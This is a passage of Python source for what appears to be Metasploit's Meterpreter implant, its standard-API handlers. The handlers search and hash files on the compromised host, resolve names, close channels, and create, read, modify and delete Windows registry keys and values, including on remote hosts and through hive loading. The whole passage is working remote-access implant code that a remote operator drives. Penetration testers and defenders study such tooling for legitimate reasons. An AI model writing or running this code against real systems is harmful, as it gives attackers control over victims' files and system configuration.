		for f in filter(lambda f: fnmatch.fnmatch(f, glob), os.listdir(search_root)):
			file_tlv  = ''
			file_tlv += tlv_pack(TLV_TYPE_FILE_PATH, search_root)
			file_tlv += tlv_pack(TLV_TYPE_FILE_NAME, f)
			file_tlv += tlv_pack(TLV_TYPE_FILE_SIZE, os.stat(os.path.join(search_root, f)).st_size)
			response += tlv_pack(TLV_TYPE_SEARCH_RESULTS, file_tlv)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_separator(request, response):
	response += tlv_pack(TLV_TYPE_STRING, os.sep)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_sha1(request, response):
	if sys.version_info[0] == 2 and sys.version_info[1] < 5:
		import sha1
		m = sha1.new()
	else:
		import hashlib
		m = hashlib.sha1()
	path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	m.update(open(path, 'rb').read())
	response += tlv_pack(TLV_TYPE_FILE_NAME, m.digest())
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_stat(request, response):
	path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	st_buf = get_stat_buffer(path)
	response += tlv_pack(TLV_TYPE_STAT_BUF, st_buf)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_net_resolve_host(request, response):
	hostname = packet_get_tlv(request, TLV_TYPE_HOST_NAME)['value']
	family = packet_get_tlv(request, TLV_TYPE_ADDR_TYPE)['value']
	if family == WIN_AF_INET:
		family = socket.AF_INET
	elif family == WIN_AF_INET6:
		family = socket.AF_INET6
	else:
		raise Exception('invalid family')
	result = resolve_host(hostname, family)
	response += tlv_pack(TLV_TYPE_IP, result['packed_address'])
	response += tlv_pack(TLV_TYPE_ADDR_TYPE, result['family'])
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_net_resolve_hosts(request, response):
	family = packet_get_tlv(request, TLV_TYPE_ADDR_TYPE)['value']
	if family == WIN_AF_INET:
		family = socket.AF_INET
	elif family == WIN_AF_INET6:
		family = socket.AF_INET6
	else:
		raise Exception('invalid family')
	for hostname in packet_enum_tlvs(request, TLV_TYPE_HOST_NAME):
		hostname = hostname['value']
		try:
			result = resolve_host(hostname, family)
		except socket.error:
			result = {'family':family, 'packed_address':''}
		response += tlv_pack(TLV_TYPE_IP, result['packed_address'])
		response += tlv_pack(TLV_TYPE_ADDR_TYPE, result['family'])
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_net_socket_tcp_shutdown(request, response):
	channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)
	channel = meterpreter.channels[channel_id]
	channel.close()
	return ERROR_SUCCESS, response

@meterpreter.register_function_windll
def stdapi_registry_close_key(request, response):
	hkey = packet_get_tlv(request, TLV_TYPE_HKEY)['value']
	result = ctypes.windll.advapi32.RegCloseKey(hkey)
	return ERROR_SUCCESS, response

@meterpreter.register_function_windll
def stdapi_registry_create_key(request, response):
	root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
	base_key = packet_get_tlv(request, TLV_TYPE_BASE_KEY)['value']
	permission = packet_get_tlv(request, TLV_TYPE_PERMISSION).get('value', winreg.KEY_ALL_ACCESS)
	res_key = ctypes.c_void_p()
	if ctypes.windll.advapi32.RegCreateKeyExA(root_key, base_key, 0, None, 0, permission, None, ctypes.byref(res_key), None) == ERROR_SUCCESS:
		response += tlv_pack(TLV_TYPE_HKEY, res_key.value)
		return ERROR_SUCCESS, response
	return ERROR_FAILURE, response

@meterpreter.register_function_windll
def stdapi_registry_delete_key(request, response):
	root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
	base_key = packet_get_tlv(request, TLV_TYPE_BASE_KEY)['value']
	flags = packet_get_tlv(request, TLV_TYPE_FLAGS)['value']
	if (flags & DELETE_KEY_FLAG_RECURSIVE):
		result = ctypes.windll.shlwapi.SHDeleteKeyA(root_key, base_key)
	else:
		result = ctypes.windll.advapi32.RegDeleteKeyA(root_key, base_key)
	return result, response

@meterpreter.register_function_windll
def stdapi_registry_delete_value(request, response):
	root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
	value_name = packet_get_tlv(request, TLV_TYPE_VALUE_NAME)['value']
	result = ctypes.windll.advapi32.RegDeleteValueA(root_key, value_name)
	return result, response

@meterpreter.register_function_windll
def stdapi_registry_enum_key(request, response):
	ERROR_MORE_DATA = 0xea
	ERROR_NO_MORE_ITEMS = 0x0103
	hkey = packet_get_tlv(request, TLV_TYPE_HKEY)['value']
	name = (ctypes.c_char * 4096)()
	index = 0
	tries = 0
	while True:
		result = ctypes.windll.advapi32.RegEnumKeyA(hkey, index, name, ctypes.sizeof(name))
		if result == ERROR_MORE_DATA:
			if tries > 3:
				break
			name = (ctypes.c_char * (ctypes.sizeof(name) * 2))
			tries += 1
			continue
		elif result == ERROR_NO_MORE_ITEMS:
			result = ERROR_SUCCESS
			break
		elif result != ERROR_SUCCESS:
			break
		tries = 0
		response += tlv_pack(TLV_TYPE_KEY_NAME, ctypes.string_at(name))
		index += 1
	return result, response

@meterpreter.register_function_windll
def stdapi_registry_enum_value(request, response):
	ERROR_MORE_DATA = 0xea
	ERROR_NO_MORE_ITEMS = 0x0103
	hkey = packet_get_tlv(request, TLV_TYPE_HKEY)['value']
	name = (ctypes.c_char * 4096)()
	name_sz = ctypes.c_uint32()
	index = 0
	tries = 0
	while True:
		name_sz.value = ctypes.sizeof(name)
		result = ctypes.windll.advapi32.RegEnumValueA(hkey, index, name, ctypes.byref(name_sz), None, None, None, None)
		if result == ERROR_MORE_DATA:
			if tries > 3:
				break
			name = (ctypes.c_char * (ctypes.sizeof(name) * 3))
			tries += 1
			continue
		elif result == ERROR_NO_MORE_ITEMS:
			result = ERROR_SUCCESS
			break
		elif result != ERROR_SUCCESS:
			break
		tries = 0
		response += tlv_pack(TLV_TYPE_VALUE_NAME, ctypes.string_at(name))
		index += 1
	return result, response

@meterpreter.register_function_windll
def stdapi_registry_load_key(request, response):
	root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)
	sub_key = packet_get_tlv(request, TLV_TYPE_BASE_KEY)
	file_name = packet_get_tlv(request, TLV_TYPE_FILE_PATH)
	result = ctypes.windll.advapi32.RegLoadKeyA(root_key, sub_key, file_name)
	return result, response

@meterpreter.register_function_windll
def stdapi_registry_open_key(request, response):
	root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
	base_key = packet_get_tlv(request, TLV_TYPE_BASE_KEY)['value']
	permission = packet_get_tlv(request, TLV_TYPE_PERMISSION).get('value', winreg.KEY_ALL_ACCESS)
	handle_id = ctypes.c_void_p()
	if ctypes.windll.advapi32.RegOpenKeyExA(root_key, base_key, 0, permission, ctypes.byref(handle_id)) == ERROR_SUCCESS:
		response += tlv_pack(TLV_TYPE_HKEY, handle_id.value)
		return ERROR_SUCCESS, response
	return ERROR_FAILURE, response

@meterpreter.register_function_windll
def stdapi_registry_open_remote_key(request, response):
	target_host = packet_get_tlv(request, TLV_TYPE_TARGET_HOST)['value']
	root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
	result_key = ctypes.c_void_p()
	result = ctypes.windll.advapi32.RegConnectRegistry(target_host, root_key, ctypes.byref(result_key))
	if (result == ERROR_SUCCESS):
		response += tlv_pack(TLV_TYPE_HKEY, result_key.value)
		return ERROR_SUCCESS, response
	return ERROR_FAILURE, response

@meterpreter.register_function_windll
def stdapi_registry_query_class(request, response):
	hkey = packet_get_tlv(request, TLV_TYPE_HKEY)['value']
	value_data = (ctypes.c_char * 4096)()
	value_data_sz = ctypes.c_uint32()
	value_data_sz.value = ctypes.sizeof(value_data)
	result = ctypes.windll.advapi32.RegQueryInfoKeyA(hkey, value_data, ctypes.byref(value_data_sz), None, None, None, None, None, None, None, None, None)
	if result == ERROR_SUCCESS:
		response += tlv_pack(TLV_TYPE_VALUE_DATA, ctypes.string_at(value_data))
		return ERROR_SUCCESS, response
	return ERROR_FAILURE, response

@meterpreter.register_function_windll
def stdapi_registry_query_value(request, response):
	REG_SZ = 1
	REG_DWORD = 4
	hkey = packet_get_tlv(request, TLV_TYPE_HKEY)['value']
	value_name = packet_get_tlv(request, TLV_TYPE_VALUE_NAME)['value']
	value_type = ctypes.c_uint32()
	value_type.value = 0
	value_data = (ctypes.c_ubyte * 4096)()
	value_data_sz = ctypes.c_uint32()
	value_data_sz.value = ctypes.sizeof(value_data)
	result = ctypes.windll.advapi32.RegQueryValueExA(hkey, value_name, 0, ctypes.byref(value_type), value_data, ctypes.byref(value_data_sz))
	if result == ERROR_SUCCESS:
		response += tlv_pack(TLV_TYPE_VALUE_TYPE, value_type.value)
		if value_type.value == REG_SZ:
			response += tlv_pack(TLV_TYPE_VALUE_DATA, ctypes.string_at(value_data) + '\x00')
		elif value_type.value == REG_DWORD:
			value = value_data[:4]
			value.reverse()
			value = ''.join(map(chr, value))
			response += tlv_pack(TLV_TYPE_VALUE_DATA, value)
		else:
			response += tlv_pack(TLV_TYPE_VALUE_DATA, ctypes.string_at(value_data, value_data_sz.value))
		return ERROR_SUCCESS, response
	return ERROR_FAILURE, response

@meterpreter.register_function_windll
def stdapi_registry_set_value(request, response):
	hkey = packet_get_tlv(request, TLV_TYPE_HKEY)['value']
	value_name = packet_get_tlv(request, TLV_TYPE_VALUE_NAME)['value']
	value_type = packet_get_tlv(request, TLV_TYPE_VALUE_TYPE)['value']
	value_data = packet_get_tlv(request, TLV_TYPE_VALUE_DATA)['value']
	result = ctypes.windll.advapi32.RegSetValueExA(hkey, value_name, 0, value_type, value_data, len(value_data))
	return result, response

@meterpreter.register_function_windll
def stdapi_registry_unload_key(request, response):
	root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
	base_key = packet_get_tlv(request, TLV_TYPE_BASE_KEY)['value']
	result = ctypes.windll.advapi32.RegUnLoadKeyA(root_key, base_key)
	return result, response
